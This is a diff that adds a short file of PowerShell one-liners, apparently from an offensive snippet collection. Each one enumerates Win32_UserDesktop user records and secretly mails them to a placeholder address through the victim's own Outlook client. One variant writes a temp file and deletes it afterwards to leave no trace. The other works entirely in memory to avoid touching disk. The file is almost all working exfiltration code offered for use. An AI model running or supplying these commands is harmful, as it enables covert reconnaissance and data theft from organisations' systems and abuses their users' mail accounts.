@@ -1,0 +1,10 @@
+PowerShell
+
+Executes Enumerate_domain_users_win32_userdesktop and emails the results to the defined email address using clients outlook but drops to disk for temp and deletes after.
+
+Get-CimInstance -ClassName Win32_UserDesktop | Format-Table -AutoSize | Out-String -Stream | Out-File -FilePath $env:TEMP\Win32_UserDesktop.txt ; $email = New-Object -ComObject Outlook.Application; $mail = $email.CreateItem(0); $mail.To = "Add-Recipient-Email-Address"; $mail.Subject = "Win32_UserDesktop"; $mail.Body = "Please find attached the results of the Win32_UserDesktop query."; $attachment = $mail.Attachments.Add("$env:TEMP\Win32_UserDesktop.txt"); $mail.Send(); Remove-Item -Path $env:TEMP\Win32_UserDesktop.txt
+
+
+Same as above but does not save to disk, all in memory. 
+
+$result = Get-CimInstance -ClassName Win32_UserDesktop | Format-Table -AutoSize | Out-String ; $email = New-Object -ComObject Outlook.Application; $mail = $email.CreateItem(0); $mail.To = "Add-Recipient-Email-Address"; $mail.Subject = "Win32_UserDesktop"; $mail.Body = "Please find the results of the Win32_UserDesktop query below:`n`n$result"; $mail.Send();
